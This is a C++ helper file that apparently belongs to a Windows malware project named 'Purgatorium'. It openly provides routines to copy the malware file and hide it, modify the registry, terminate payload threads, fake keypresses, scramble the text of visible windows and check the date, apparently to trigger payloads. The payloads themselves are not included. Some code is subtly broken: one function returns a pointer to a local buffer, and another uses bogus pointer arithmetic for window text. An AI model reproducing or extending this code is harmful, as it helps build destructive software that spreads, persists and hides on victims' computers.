typedef struct IUnknown IUnknown;

#pragma once

#include "Purgatorium.h"

namespace System
{
	VOID RedrawScreen(VOID)
	{
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
	}

	VOID EndPayload(HANDLE hPayload, HANDLE hPML)
	{
		TerminateThread(hPayload, NULL);
		CloseHandle(hPayload);
		HeapDestroy(hPML);
	}

	VOID SetRegValue(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPBYTE lpData, DWORD cbData)
	{
		HKEY phkResult;

		RegOpenKeyExW(hKey, lpSubKey, NULL, KEY_SET_VALUE, &phkResult);
		RegSetValueExW(phkResult, lpValueName, NULL, dwType, lpData, cbData);
		
		RegCloseKey(phkResult);
	}

	VOID CreateRegKey(HKEY hKey, LPCWSTR lpSubKey)
	{
		HKEY phkResult;

		RegCreateKeyW(hKey, lpSubKey, &phkResult);
		
		RegCloseKey(phkResult);
	}

	LPCWSTR GetCurrentFileDir()
	{
		WCHAR buffer[MAX_PATH];
		GetModuleFileName(NULL, buffer, MAX_PATH);

		return (LPCWSTR)buffer;
	}

	VOID CopyMalwareFile(LPCWSTR orgPathFile, WCHAR dstPathFile[])
	{
		CopyFileW(orgPathFile, dstPathFile, TRUE);
	}

	VOID HideFile(LPCWSTR orgPathFile)
	{
		SetFileAttributesW(orgPathFile, FILE_ATTRIBUTE_HIDDEN);
	}

	INT CheckDate(INT i)
	{
		time_t t = time(0);
		tm date = *localtime(&t);

		if (i == 0) i = date.tm_mday; //1-31
		if (i == 1) i = date.tm_mon;  //0-11
		if (i == 2) i = date.tm_year; //XXXX

		return i;
	}

	VOID PressKey(WORD key, INT time)
	{
		INPUT pInputs = { 0 };

		pInputs.type = INPUT_KEYBOARD;
		pInputs.ki.wVk = key;

		//PRESS KEY
		SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));

		Sleep(time);

		pInputs.ki.dwFlags = KEYEVENTF_KEYUP;

		//FREE KEY
		SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
	}

	BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
	{
		const WCHAR* labelText = L"" + rand() % 512;

		if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE) 
		{
			SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
		}

		return true;
	}

	BOOL IsWindowsXP(VOID)
	{
		OSVERSIONINFOW lpVersionInformation;

		RtlZeroMemory(&lpVersionInformation, sizeof(OSVERSIONINFOW));
		lpVersionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);

		GetVersionExW(&lpVersionInformation);

		if (lpVersionInformation.dwMajorVersion == 5)
		{
			return TRUE;
		}

		return FALSE;
	}
}